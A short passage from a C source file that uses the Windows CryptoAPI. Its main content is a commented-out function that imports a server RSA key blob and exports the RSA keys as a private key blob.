	printf("\n");

	return TRUE;

}

//BOOL Pubkey() {
//
//	HCRYPTPROV hCryptProv = NULL;
//	HCRYPTKEY hkey = NULL;
//	if (!CryptAcquireContext(&hCryptProv, NULL, MS_ENHANCED_PROV, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT)) {
//		printf("Error %u acquiring cryptographic context\n", GetLastError());
//		return FALSE;
//	}
//
//	if (!CryptImportKey(hCryptProv, serverPrivateKey, sizeof(serverPrivateKey), NULL, CRYPT_EXPORTABLE, &hkey)) {
//		printf("error %d",GetLastError());
//		return FALSE;
//	}
//
//	ExportRSAkeys(hCryptProv, hkey,PRIVATEKEYBLOB);
//	return TRUE;
//}